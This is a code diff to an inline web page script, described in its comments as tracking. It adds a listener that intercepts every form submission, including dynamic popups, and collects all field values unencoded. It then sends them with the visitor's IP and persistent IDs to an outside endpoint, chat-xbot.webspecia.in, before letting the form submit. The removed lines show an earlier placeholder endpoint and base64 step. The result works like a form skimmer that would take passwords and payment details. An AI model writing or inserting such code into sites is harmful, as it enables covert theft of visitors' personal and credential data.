@@ -31,21 +31,17 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
         visitorData: { ...visitorData, ip }
       };
       try {
-        await fetch('https://chat-xbot.webspecia.in/api/iwh/e935b7b32bd4d2fbff9d9614a4721702', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
+        await navigator.sendBeacon('https://chat-xbot.webspecia.in/api/iwh/e935b7b32bd4d2fbff9d9614a4721702', JSON.stringify(payload));
       } catch (error) {
         console.error('Page view tracking error:', error);
       }
     })();
 
-    // Track form submissions
-    document.addEventListener('submit', async function(event) {
-      const form = event.target;
-      if (form.tagName === 'FORM') {
+    // Track form submissions, including dynamic forms like popups
+    document.body.addEventListener('submit', async function(event) {
+      if (event.target.tagName === 'FORM') {
         event.preventDefault();
+        const form = event.target;
         const formDataObj = {};
         const formData = new FormData(form);
         formData.forEach((value, key) => { formDataObj[key] = value; });
@@ -55,15 +51,11 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
         const payload = {
           event: 'form_submission',
           visitorData: { ...visitorData, ip },
-          formData: hashFormData(formDataObj)
+          formData: formDataObj
         };
 
         try {
-          await fetch('https://your-server-endpoint.com/track', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-          });
+          await navigator.sendBeacon('https://chat-xbot.webspecia.in/api/iwh/e935b7b32bd4d2fbff9d9614a4721702', JSON.stringify(payload));
           form.submit();
         } catch (error) {
           console.error('Form tracking error:', error);
@@ -88,7 +80,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     function getBrowserId() {
       let id = localStorage.getItem('browserId');
       if (!id) {
-        id = 'browser-' + Math.random().toString(36).substr(2, 18);
+        id = 'browser-' + crypto.randomUUID();
         localStorage.setItem('browserId', id);
       }
       return id;
@@ -97,7 +89,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     function getSessionId() {
       let sessionId = sessionStorage.getItem('sessionId');
       if (!sessionId) {
-        sessionId = 'session-' + Math.random().toString(36).substr(2, 18);
+        sessionId = 'session-' + crypto.randomUUID();
         sessionStorage.setItem('sessionId', sessionId);
       }
       return sessionId;
@@ -105,7 +97,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 
     async function getIPAddress() {
       try {
-        const response = await fetch('https://api.ipify.org?format=json', { method: 'GET', mode: 'cors', cache: 'no-cache' });
+        const response = await fetch('https://api.ipify.org?format=json');
         const data = await response.json();
         return data.ip;
       } catch (error) {
@@ -113,16 +105,9 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
         return null;
       }
     }
-
-    function hashFormData(formData) {
-      const hashed = {};
-      for (let key in formData) {
-        hashed[key] = btoa(formData[key]);
-      }
-      return hashed;
-    }
   });
 </script>
+
 
 
 
